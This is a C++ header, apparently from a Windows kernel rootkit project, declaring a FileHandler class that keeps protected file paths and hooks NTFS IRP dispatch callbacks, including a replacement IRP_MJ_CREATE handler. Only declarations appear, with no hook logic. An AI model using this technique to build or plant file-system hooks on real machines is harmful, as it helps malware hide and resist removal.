#pragma once

#include "pch.h"
#include "MemoryHelper.hpp"
#include "MemoryAllocator.hpp"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "FileHelper.h"
#include "ListHelper.hpp"

// Definitions.
constexpr SIZE_T SUPPORTED_HOOKED_NTFS_CALLBACKS = IRP_MJ_MAXIMUM_FUNCTION;

enum class FileType {
	Protected,
	All
};

struct ProtectedFile {
	WCHAR* FilePath;
	bool Protect;
};

struct IoctlFileList {
	SIZE_T Count;
	FileItem* Files;
};

struct FileItem {
	LIST_ENTRY Entry;
	ULONG FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

struct NtfsCallback {
	PVOID Address;
	bool Activated;
};

class FileHandler {
private:
	FilesList protectedFiles;
	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];

public:
	void* operator new(size_t size) noexcept {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	FileHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~FileHandler();

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindFile(_In_ WCHAR* path, _In_ FileType type) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool ProtectFile(_In_ WCHAR* path);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveFile(_In_ WCHAR* path, _In_ FileType type);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearFilesList(_In_ FileType type);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListProtectedFiles(_Inout_ IoctlFileList* filesList);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS InstallNtfsHook(_In_ ULONG irpMjFunction);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS UninstallNtfsHook(_In_ ULONG irpMjFunction);

	_IRQL_requires_max_(APC_LEVEL)
	PVOID GetNtfsCallback(_In_ ULONG index) const;
};

inline FileHandler* NidhoggFileHandler;

_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);
